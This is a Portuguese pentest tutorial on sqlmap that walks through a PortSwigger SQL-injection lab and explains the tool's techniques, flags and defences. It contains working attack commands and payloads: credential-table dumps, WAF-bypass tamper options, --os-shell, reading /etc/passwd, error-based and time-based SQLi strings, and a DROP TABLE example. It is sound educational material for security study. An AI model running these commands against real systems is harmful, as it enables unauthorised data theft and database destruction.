## 📖 O que é o sqlmap?

> **sqlmap** é uma ferramenta **open source** de penetração que **automatiza** a detecção e exploração de **SQL Injection**. Escrita em Python, é a referência de fato para esse tipo de teste.

### O que faz, em uma frase

> Recebe uma URL com parâmetros suspeitos → testa SQLi automaticamente → enumera estrutura do banco → extrai dados.

## 🚀 Uso Básico — Comandos Essenciais

### 1️⃣ Detectar SQL Injection numa URL

```bash
sqlmap -u "https://alvo.com/filter?category=Pets"
```

O sqlmap vai testar **dezenas de payloads** automaticamente e dizer se o parâmetro `category` é vulnerável.

### 2️⃣ Listar bancos de dados disponíveis

```bash
sqlmap -u "https://alvo.com/filter?category=Pets" --dbs
```

Saída esperada:
```
[*] information_schema
[*] mysql
[*] performance_schema
[*] sys
[*] webapp_db  ← banco da aplicação alvo
```

### 3️⃣ Listar tabelas de um banco

```bash
sqlmap -u "https://alvo.com/filter?category=Pets" -D webapp_db --tables
```

Saída:
```
Database: webapp_db
[5 tables]
+-----------+
| products  |
| users     |
| orders    |
| sessions  |
| audit_log |
+-----------+
```

### 4️⃣ Listar colunas de uma tabela

```bash
sqlmap -u "https://alvo.com/filter?category=Pets" -D webapp_db -T users --columns
```

Saída:
```
Database: webapp_db
Table: users
[4 columns]
+----------+--------------+
| Column   | Type         |
+----------+--------------+
| id       | int(11)      |
| username | varchar(50)  |
| password | varchar(255) |
| email    | varchar(100) |
+----------+--------------+
```

### 5️⃣ Despejar dados (dump)

```bash
sqlmap -u "https://alvo.com/filter?category=Pets" -D webapp_db -T users --dump
```

Saída:
```
+----+---------------+--------------------+
| id | username      | password           |
+----+---------------+--------------------+
| 1  | administrator | s3cr3tP@ssw0rd     |
| 2  | wiener        | peter              |
| 3  | carlos        | montoya            |
+----+---------------+--------------------+
```

## 🧪 Walkthrough Prático — Mesmo Lab dos [58.md](58.md) e [59.md](59.md), com sqlmap

> **Lab:** [SQL injection UNION attack, retrieving data from other tables](https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables)
>
> **Objetivo:** Solucionar o **mesmo lab** que resolvemos manualmente em [58.md](58.md) (descobrir colunas) e [59.md](59.md) (extrair dados), mas agora **deixando o sqlmap fazer todo o trabalho**.

### Passo 1 — Preparar a URL

1. Acesse o lab no PortSwigger → **Access the Lab**
2. Na aplicação **We Like to Shop**, clique no filtro **Pets**
3. Copie a URL completa, ex:

```
https://<lab-id>.web-security-academy.net/filter?category=Pets
```

> 💡 Note que copiamos a URL **com** o parâmetro `category=Pets`. O sqlmap usa isso como ponto de partida para detectar o parâmetro injetável.

### Passo 2 — Listar bancos de dados

No terminal do Kali, digite:

```bash
sqlmap -u "https://<lab-id>.web-security-academy.net/filter?category=Pets" --dbs
```

**Durante a execução**, o sqlmap pode fazer perguntas como:

```
[?] do you want to skip test payloads specific for other DBMSes? [Y/n]
[?] heuristic (basic) test shows that GET parameter 'category' might be injectable. Do you want to include all tests? [y/N]
```

Para cada pergunta:
- **`y`** → sim
- **`n`** → não
- **`Enter`** → aceita o default (maiúscula entre colchetes)

> 💡 Para evitar prompts e aceitar tudo automaticamente: adicione `--batch` ao final do comando.

**Resultado esperado:**

```
available databases [2]:
[*] information_schema
[*] public
```

> 🔑 **Atenção:** `public` **não é o nome do banco** — é o **schema padrão do PostgreSQL**. Isso já nos diz que o SGBD do lab é **PostgreSQL**. Em MySQL apareceria algo como `mysql`, `webapp_db`, etc.

### Passo 3 — Listar tabelas do schema `public`

```bash
sqlmap -u "<url>" -D public --tables
```

**Resultado esperado:**

```
Database: public
[2 tables]
+----------+
| products |
| users    |
+----------+
```

🎯 Aparece a tabela `users` — exatamente a que extraímos manualmente em [59.md](59.md).

### Passo 4 — Listar colunas da tabela `users`

```bash
sqlmap -u "<url>" -D public -T users --columns
```

**Resultado esperado:**

```
Database: public
Table: users
[2 columns]
+----------+---------+
| Column   | Type    |
+----------+---------+
| password | varchar |
| username | varchar |
+----------+---------+
```

### Passo 5 — Despejar dados (`--dump`)

```bash
sqlmap -u "<url>" -D public -T users -C "password,username" --dump
```

> ⚠️ **Atenção a um erro comum:** a flag é `--dump` (com **dois traços**), e a flag para escolher colunas é `-C "col1,col2"`. A transcrição original tinha `-dump` (com um traço só) e `--columns "password,username"`, que estão sintaticamente incorretos no sqlmap moderno.

**Resultado esperado:**

```
Database: public
Table: users
[3 entries]
+--------------+---------------+
| username     | password      |
+--------------+---------------+
| administrator | s3cr3tP@ssw0rd|
| wiener        | peter         |
| carlos        | montoya       |
+--------------+---------------+
```

🎯 **Lab resolvido!** Copie a senha do `administrator` → faça login → solucione o desafio.

### 💡 Quando o sqlmap "trava" ou demora

Algumas dicas se o sqlmap **parecer travado** ou demorar muito:

| Problema | Solução |
|----------|---------|
| Muitos prompts interativos | Use `--batch` |
| Lentidão excessiva | Use `--threads=5` (cuidado com rate limit) |
| WAF bloqueando payloads | Use `--tamper=between` ou outros tampers |
| Resultados confusos | Reduza nível: `--level=1 --risk=1` |
| Sessão expirou (cookie) | Atualize com `--cookie="session=novo-valor"` |
| Resultado em cache antigo | Adicione `--flush-session` |

## ⚙️ Flags Avançadas

### Autenticação e cookies

```bash
# Com cookie de sessão (após login)
sqlmap -u "https://alvo.com/api/user" --cookie="session=abc123"

# Com header customizado (ex: API key)
sqlmap -u "https://alvo.com/api/user" --headers="X-API-Key: xyz"

# Com autenticação HTTP Basic
sqlmap -u "https://alvo.com" --auth-type=Basic --auth-cred="user:pass"
```

### Métodos POST e dados

```bash
# POST com body
sqlmap -u "https://alvo.com/login" --data="username=admin&password=test"

# Indicando qual parâmetro testar
sqlmap -u "https://alvo.com/login" --data="username=admin&password=test" -p username
```

### Bypass de WAF (tamper scripts)

```bash
# Comentários aleatórios
sqlmap -u "URL" --tamper=between

# Trocar espaços por tabs
sqlmap -u "URL" --tamper=space2comment

# Múltiplos tampers
sqlmap -u "URL" --tamper=space2comment,between,randomcase
```

> 💡 Lista completa de tampers em `/usr/share/sqlmap/tamper/`

### Velocidade e cautela

```bash
# Atrasar requisições (evitar rate limit)
sqlmap -u "URL" --delay=2

# Aleatorizar User-Agent
sqlmap -u "URL" --random-agent

# Threads paralelos (mais rápido, mas mais barulhento)
sqlmap -u "URL" --threads=5

# Nível de profundidade (1-5) e risco (1-3)
sqlmap -u "URL" --level=5 --risk=3
```

### Outras úteis

```bash
# Pegar shell SQL interativo
sqlmap -u "URL" --sql-shell

# Pegar shell no SO (se permissões permitirem!)
sqlmap -u "URL" --os-shell

# Ler arquivo do servidor
sqlmap -u "URL" --file-read=/etc/passwd

# Quebrar hashes encontrados
sqlmap -u "URL" -D db -T users -C password --dump --crack
```

## 🎯 As 6 Técnicas de SQLi do sqlmap

O sqlmap suporta **6 técnicas distintas** de injeção, cada uma identificada por uma **letra** que vira flag no `--technique`. Conhecer essa tabela é essencial para **controlar o que o sqlmap testa** — e ganhar performance.

### Tabela-mestre das técnicas

| Letra | Técnica | O que faz | Quando aparece |
|:-----:|---------|-----------|----------------|
| **B** | **Boolean-based blind** | Infere dados via condições `TRUE/FALSE` e diferença na página | Não vê erro nem extrai dado direto — só compara comportamento |
| **E** | **Error-based** | Força o banco a gerar erros que **vazam dados** na própria mensagem | Erros do banco aparecem na página (mau desenvolvimento) |
| **Q** | **Inline (Command-based)** | Embute consulta SQL dentro de outra (subquery) | Quando o input é usado em contexto restrito |
| **S** | **Stacked queries** | Encerra a query atual com `;` e **adiciona uma nova** | Permite `INSERT`, `UPDATE`, `DELETE` (não só `SELECT`) |
| **T** | **Time-based blind** | Infere via **tempo** de resposta (`SLEEP()`, `WAITFOR DELAY`) | Aplicação não retorna nem erros nem páginas diferentes |
| **U** | **UNION-based** | Anexa segunda query com `UNION SELECT` ([59.md](59.md)) | Resposta da query original é exibida na página |

### Explicação detalhada de cada técnica

#### 1️⃣ **B** — Boolean-based blind

Quando a aplicação **não exibe dados** nem erros, mas **a página muda** dependendo da condição:

```sql
-- Página A (login OK)
?id=1 AND 1=1--

-- Página B (login falha — diferente)
?id=1 AND 1=2--
```

Comparando as páginas, o atacante infere bit-a-bit o conteúdo do banco (lento, mas funciona).

#### 2️⃣ **E** — Error-based

Quando o banco gera erros e a aplicação os **exibe na tela**:

```sql
?id=1 AND extractvalue(rand(), concat(0x7e, (SELECT password FROM users LIMIT 1)))
```

A mensagem de erro do MySQL contém o valor extraído. Rápido, mas exige mensagens de erro visíveis.

#### 3️⃣ **Q** — Inline queries (Command-based)

Quando o input é embutido **dentro de uma função SQL**, sem possibilidade de fechar a query:

```sql
SELECT CONCAT('Olá ', (SELECT name FROM users WHERE id = $input))
```

#### 4️⃣ **S** — Stacked queries (consultas empilhadas)

Quando o driver permite **múltiplas queries** separadas por `;`:

```sql
?id=1; DROP TABLE users--
?id=1; INSERT INTO admins VALUES ('hacker', 'pwned')--
```

> ⚠️ Stacked queries **não funcionam em MySQL via PHP/mysqli** por padrão. Funcionam bem em **PostgreSQL, MSSQL** e drivers que permitem multi-statement.

#### 5️⃣ **T** — Time-based blind

Quando **nem dados nem erros nem páginas diferentes** aparecem, mas o atacante mede o **tempo de resposta**:

```bash
# Exemplo Microsoft SQL Server (WAITFOR DELAY)
http://exemplo.com/produto.php?id=A' waitfor delay '00:00:10'--

# Exemplo MySQL (SLEEP)
http://exemplo.com/produto.php?id=1 AND SLEEP(10)--

# Exemplo PostgreSQL (pg_sleep)
http://exemplo.com/produto.php?id=1 AND pg_sleep(10)--
```

Lógica:
> *"Se a primeira letra do nome do usuário admin for **A**, espere 10 segundos.*
> *Se for **B**, espere 10 segundos. Etc."*

O atacante mede: **resposta lenta = condição verdadeira**. Funciona em qualquer aplicação, mas é **muito lento** — pode levar horas para extrair uma única senha.

#### 6️⃣ **U** — UNION-based

Já vimos em [59.md](59.md): anexa segunda query com `UNION SELECT` para extrair dados de outras tabelas. **Rápida** e ideal quando o resultado da query aparece na página.

---

### 🎛️ Controlando quais técnicas testar — `--technique`

Por padrão, sqlmap testa **todas as 6** (`BEUSTQ`). Para **otimizar performance**, você pode limitar:

```bash
# Testa apenas Time-based e UNION
sqlmap -u "URL" --technique=TU

# Testa apenas Boolean + Error (rápidas)
sqlmap -u "URL" --technique=BE

# Testa só UNION (a mais comum em pentest)
sqlmap -u "URL" --technique=U

# Pula stacked (que pode causar danos)
sqlmap -u "URL" --technique=BEUT
```

### 💡 Estratégia de Performance

| Cenário | Técnicas recomendadas | Por quê |
|---------|----------------------|---------|
| **Triagem rápida** | `BEU` | As mais rápidas e comuns |
| **Suspeita de blind** | `BT` | Quando nada aparece na resposta |
| **Pentest agressivo** | `BEUSTQ` (padrão) | Testa tudo |
| **Ambiente de produção (cuidado!)** | `BEU` | Evita `S` (stacked) que pode alterar dados |
| **Lab de estudo** | `BEUSTQ` | Aprenda observando todas as técnicas |

> ⚠️ **Em pentest real, evite `S` (stacked queries) sem autorização explícita** — pode executar `INSERT`/`UPDATE`/`DELETE` indevidamente.

### 🗺️ Comparação Técnicas × Velocidade × Visibilidade

| Técnica | Velocidade | Precisa de... | Risco de causar dano |
|---------|:----------:|---------------|:--------------------:|
| **U** UNION | ⚡⚡⚡ Rápida | Resposta visível na página | 🟢 Baixo (só lê) |
| **E** Error-based | ⚡⚡⚡ Rápida | Erros expostos | 🟢 Baixo (só lê) |
| **B** Boolean | ⚡⚡ Média | Páginas diferentes | 🟢 Baixo (só lê) |
| **Q** Inline | ⚡⚡ Média | Input em subquery | 🟢 Baixo (só lê) |
| **T** Time-based | 🐢 Lenta | Apenas tempo medível | 🟢 Baixo (só lê, mas demora) |
| **S** Stacked | ⚡⚡⚡ Rápida | Driver permite `;` | 🔴 **ALTO** (pode escrever/destruir) |

## 🎓 Conceitos do sqlmap

| Termo | Definição |
|-------|-----------|
| **Boolean-based blind** | Inferir dados via páginas diferentes (True vs False) |
| **Time-based blind** | Inferir via tempo de resposta (`SLEEP()`) |
| **Error-based** | Extrair dados via mensagens de erro do banco |
| **UNION-based** | Anexar dados com `UNION SELECT` (visto em [59.md](59.md)) |
| **Stacked queries** | Múltiplas queries com `;` |
| **Inline queries** | Subqueries dentro do payload |
| **Tamper script** | Transformação do payload para evadir WAF/IDS |
| **Fingerprinting** | Identificar SGBD pelo comportamento (MySQL vs PostgreSQL vs etc.) |
| **`--batch`** | Modo não-interativo (aceita defaults) |
| **`--level`** | Profundidade de testes (1-5) |
| **`--risk`** | Quão "agressivos" são os payloads (1-3) |

## 🛡️ Defesa Contra sqlmap

> 🔑 **A defesa contra sqlmap é exatamente a mesma de SQLi: prepared statements.**

Se sua aplicação **não tem SQLi**, sqlmap simplesmente não acha nada:

```
[INFO] testing connection to the target URL
[INFO] testing if the target URL content is stable
[INFO] testing if GET parameter 'category' is dynamic
[WARNING] GET parameter 'category' does not appear to be dynamic
[CRITICAL] all tested parameters do not appear to be injectable.
```

### Camadas de defesa específicas

| Camada | Como ajuda contra sqlmap |
|--------|-------------------------|
| **Prepared statements** | Elimina SQLi → sqlmap não encontra ponto de injeção |
| **WAF** (ModSecurity, Cloudflare) | Bloqueia payloads conhecidos do sqlmap |
| **Rate limiting** | sqlmap dispara dezenas de requests; rate limit detecta |
| **Logs e alertas** | Padrões do sqlmap são **muito reconhecíveis** (User-Agent default = `sqlmap/X.X`) |
| **Honeypot** | Endpoint falso que loga tentativas de SQLi |

### Sinais de que alguém está usando sqlmap contra você

Olhe nos logs por:

```
GET /filter?category=Pets%27%20AND%20(SELECT%20...)
User-Agent: sqlmap/1.7.2#stable (https://sqlmap.org)
```

ou mesmo com `--random-agent`, padrões repetitivos como:

- Muitas requisições para o **mesmo endpoint** com pequenas variações no parâmetro
- Payloads contendo: `AND 1=1`, `AND 1=2`, `SLEEP(5)`, `UNION SELECT NULL`, `(SELECT...)`
- Headers HTTP suspeitos: `X-Forwarded-For`, `X-Real-IP` aleatórios
- Requisições com **picos de latência** (time-based blind)

## 🎯 Caso Prático — Decodificando um Comando sqlmap (Ana Luiza)

> **Cenário:** Ana Luiza está estudando pentest e fez o seguinte comando contra a aplicação **Mutillidae** rodando em `10.0.0.1`:
>
> ```bash
> sqlmap -u "http://10.0.0.1/mutillidae/index.php?page=user-info.php&username=admin&password=123456&user-info-php-submit-button=View+Account+Details" \
>   --batch \
>   --dbms mysql \
>   --os linux \
>   --threads 3 \
>   -D mutillidae \
>   -T accounts \
>   -C "username,password,is_admin" \
>   --dump
> ```
>
> **O que esse comando faz?**

### ✅ Resposta: Comando otimizado para **dump** de credenciais

Ana Luiza está extraindo as credenciais da tabela `accounts` do banco `mutillidae`, mostrando colunas específicas (`username`, `password`, `is_admin`). Ela também **otimizou a performance** dizendo ao sqlmap qual é o SGBD, o SO e quantas threads usar.

### 🔍 Análise flag por flag

| Flag | O que faz | Tipo |
|------|-----------|------|
| `-u "URL"` | URL alvo com parâmetros injetáveis | Obrigatória |
| `--batch` | Aceita defaults sem perguntar | Automação |
| `--dbms mysql` | **Pula fingerprinting** — já sabe que é MySQL | **Performance** |
| `--os linux` | **Pula detecção** — já sabe que é Linux | **Performance** |
| `--threads 3` | 3 requisições paralelas (mais rápido) | **Performance** |
| `-D mutillidae` | Banco alvo | Escopo |
| `-T accounts` | Tabela alvo | Escopo |
| `-C "username,password,is_admin"` | Apenas essas 3 colunas | Escopo |
| `--dump` | **Despeja** os dados na tela | Ação |

### 💡 Por que dizer o SGBD e o SO acelera tanto?

Sem `--dbms mysql`, o sqlmap precisa **testar payloads de cada SGBD** (MySQL, PostgreSQL, MSSQL, Oracle, SQLite, etc.) para descobrir qual está rodando. Isso pode levar **minutos**.

Quando você passa `--dbms mysql`, o sqlmap **vai direto** aos payloads de MySQL → economiza vários ciclos de teste.

O mesmo vale para `--os linux`: sqlmap não tenta payloads específicos de Windows (`xp_cmdshell`, etc.).

### 📊 Comparação: comando completo vs comando bruto

| Comando | Performance |
|---------|-------------|
| `sqlmap -u "URL"` | 🐢 Testa tudo do zero — minutos |
| `sqlmap -u "URL" --batch` | ⚡ Sem prompts — mais rápido |
| `sqlmap -u "URL" --batch --dbms mysql --os linux` | ⚡⚡ Pula fingerprinting — mais rápido ainda |
| Comando completo da Ana Luiza | ⚡⚡⚡ **Direto ao alvo** — segundos |

### ❌ Por que as alternativas erradas eram "armadilhas"

#### B — "Derrubar a aplicação com requisições em massa" ❌

`--threads 3` significa apenas **3 conexões paralelas** — muito longe de um DoS. Para derrubar uma aplicação seria preciso uma ferramenta como **slowloris**, **hping3** ou **LOIC**, não sqlmap.

> 💡 sqlmap é uma ferramenta de **extração de dados**, não de **negação de serviço**.

#### C — "Consultar informações após os dados" ❌

`--dump` **extrai** os dados em si. Não existe "após os dados" — essa frase não tem sentido técnico em SQLi.

#### D — "Apagar a base de dados" ❌

`--dump` é **leitura** (`SELECT`). Para apagar precisaria de **stacked queries** com `DROP TABLE`:

```bash
# Hipotético comando destrutivo — NÃO USE em produção sem autorização
sqlmap -u "URL" --technique=S --sql-query="DROP TABLE accounts"
```

A flag `--dump` **nunca causa destruição** — só extração.

### 🎓 Lição para o aprendizado

Quando você sabe **antes** qual é o SGBD e o SO do alvo (via [Wappalyzer](56.md) ou inspeção manual), **passe essa info para o sqlmap**. Economiza tempo e gera menos tráfego suspeito (menos chance de WAF reagir).

### Template otimizado para uso diário

```bash
# Comando recomendado quando você já conhece o alvo
sqlmap -u "URL" \
  --batch \
  --dbms=<mysql|postgresql|mssql|oracle> \
  --os=<linux|windows> \
  --threads=5 \
  --level=3 \
  --risk=2 \
  -D <banco> -T <tabela> -C "col1,col2" \
  --dump
```

<details>
<summary>Ver respostas</summary>

1. Porque **automatiza** dezenas de testes (detecção, fingerprinting, enumeração, extração) que tomariam horas manualmente
2. **`--batch`** — aceita todos os defaults sem perguntar
3. **Não muda nada na essência** — a defesa continua sendo **prepared statements**. Sqlmap só acelera o que um atacante humano faria de qualquer jeito
4. Provavelmente **blind SQLi** (boolean-based ou time-based) — sqlmap tem flags `--technique=B` (boolean) e `--technique=T` (time)
5. **Bypass de WAF/IDS** — modifica o payload (encoding, comentários, case-mixing) para escapar de filtros
